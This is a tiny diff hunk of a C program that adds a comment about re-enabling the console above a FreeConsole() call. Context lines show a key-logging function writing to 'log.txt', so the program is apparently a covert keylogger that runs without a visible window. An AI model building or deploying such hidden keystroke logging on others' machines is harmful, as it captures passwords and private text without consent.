@@ -59,6 +59,7 @@ void log(int key, char *fileName)
 }
 int main()
 {
+// cooment next line to show console while running
     FreeConsole();
     char filename[10]="log.txt";
     FILE*f;
